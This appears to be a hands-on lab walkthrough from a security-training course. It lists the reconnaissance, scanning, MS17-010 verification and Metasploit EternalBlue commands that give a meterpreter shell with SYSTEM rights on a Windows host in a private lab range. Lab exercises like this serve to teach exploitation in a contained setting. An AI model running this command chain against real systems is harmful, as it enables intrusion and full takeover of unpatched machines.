# Lab 03 — EternalBlue Exploitation
**File:** `src/laboratorios/laboratorio03.ts`
**Date:** 2026-03-31
**Difficulty:** Hard
**Category:** Network
**Network Range:** 172.16.0.0/24
**Target:** 172.16.0.11

---

## Steps

### 01 — Network Reconnaissance
Discover hosts: `arp-scan 172.16.0.0/24`

### 02 — Port Scanning
Identify services: `nmap -sV 172.16.0.11`

### 03 — Verify Vulnerability
Execute: `msfconsole` → `use auxiliary/scanner/smb/smb_ms17_010` → `set rhosts 172.16.0.11` → `run`

### 04 — Exploit EternalBlue
Execute: `use exploit/windows/smb/ms17_010_eternalblue` → `set RHOSTS 172.16.0.11` → `set LHOST 172.16.0.10` → `exploit`

### 05 — Verify SYSTEM Access
meterpreter: `getuid`